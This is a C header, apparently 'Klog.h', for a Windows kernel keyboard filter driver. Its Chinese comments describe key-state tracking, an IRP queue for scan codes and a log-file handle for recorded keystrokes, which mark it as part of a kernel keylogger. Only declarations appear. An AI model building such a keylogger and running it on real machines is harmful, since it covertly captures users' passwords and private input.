#ifndef __Klog_h__
#define __Klog_h__

typedef BOOLEAN BOOL;

// STRUCTURES 结构体

struct KEY_STATE //按键状态
{
	bool kSHIFT; // shift键是否被按下
	bool kCAPSLOCK; // CAPSLOCK是否被按下
	bool kCTRL; // Ctrl键是否被按下
	bool kALT; // Alt键是否被按下
};

struct KEY_DATA
{
	LIST_ENTRY ListEntry;
	char KeyData;
	char KeyFlags;
};

typedef struct _DEVICE_EXTENSION
{
	PDEVICE_OBJECT pKeyboardDevice; //指向设备栈中的下一个键盘
	PETHREAD pThreadObj;			//工作进程的指针
	bool bThreadTerminate;		    // 线程是否终止
	HANDLE hLogFile;				//控制文件记录输出
	KEY_STATE kState;				//是否键入特殊按键

	//键盘扫描值的IRP信息的工作队列受信号，自旋锁，连接表的控制
	KSEMAPHORE semQueue;
	KSPIN_LOCK lockQueue;
	LIST_ENTRY QueueListHead;
}DEVICE_EXTENSION, *PDEVICE_EXTENSION;

extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT  DriverObject, IN PUNICODE_STRING RegistryPath);
VOID Unload(IN PDRIVER_OBJECT DriverObject);
NTSTATUS DispatchPassDown(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);

#endif			// __Klog_h__

